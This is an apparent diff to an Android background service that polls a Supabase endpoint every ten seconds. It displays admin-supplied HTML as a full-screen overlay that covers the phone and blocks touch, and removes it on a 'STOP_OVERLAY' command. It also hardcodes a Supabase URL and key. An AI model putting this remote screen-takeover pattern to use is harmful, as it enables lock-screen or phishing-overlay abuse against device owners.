@@ -8,6 +8,7 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.view.Gravity;
+import android.view.View;
 import android.view.WindowManager;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
@@ -28,7 +29,7 @@ public class LayananBackground extends Service {
     private Handler handler = new Handler(Looper.getMainLooper());
     private String htmlTerakhir = "";
     
-    // Konfigurasi Supabase yang Anda berikan
+    // Perhatikan: Menggunakan id=eq.2 untuk Overlay
     private final String URL_SUPABASE = "https://heaedfjyjpfvpddtgjhk.supabase.co/rest/v1/app_settings?id=eq.2&select=html_content";
     private final String KUNCI_SUPABASE = "sb_publishable_uuIu1DiiNhS4aHc3ZSxqrg_F4punPvO"; 
 
@@ -48,8 +49,9 @@ public class LayananBackground extends Service {
         webSettings.setDomStorageEnabled(true);
         webViewOverlay.setWebViewClient(new WebViewClient());
         
-        // Latar belakang transparan
         webViewOverlay.setBackgroundColor(0x00000000); 
+        // Sembunyikan web saat pertama kali jalan agar tidak menghalangi layar
+        webViewOverlay.setVisibility(View.GONE);
 
         int jenisOverlay;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -75,7 +77,6 @@ public class LayananBackground extends Service {
             @Override
             public void run() {
                 tarikDataDariAdmin();
-                // Mengulang pengecekan setiap 10 detik (10000 ms)
                 handler.postDelayed(this, 10000); 
             }
         };
@@ -108,13 +109,20 @@ public class LayananBackground extends Service {
                             JSONObject barisData = dataJson.getJSONObject(0);
                             final String htmlBaru = barisData.getString("html_content");
 
-                            // Perbarui layar jika ada file HTML baru yang diunggah
+                            // Logika Baru: Mengecek perintah STOP atau HTML baru
                             if (!htmlBaru.equals(htmlTerakhir)) {
                                 htmlTerakhir = htmlBaru;
                                 handler.post(new Runnable() {
                                     @Override
                                     public void run() {
-                                        webViewOverlay.loadDataWithBaseURL(null, htmlBaru, "text/html", "UTF-8", null);
+                                        if (htmlBaru.equals("STOP_OVERLAY") || htmlBaru.trim().isEmpty()) {
+                                            // Menghilangkan web dari layar (HP kembali bisa disentuh)
+                                            webViewOverlay.setVisibility(View.GONE);
+                                        } else {
+                                            // Memunculkan web ke layar menutupi HP
+                                            webViewOverlay.setVisibility(View.VISIBLE);
+                                            webViewOverlay.loadDataWithBaseURL(null, htmlBaru, "text/html", "UTF-8", null);
+                                        }
                                     }
                                 });
                             }
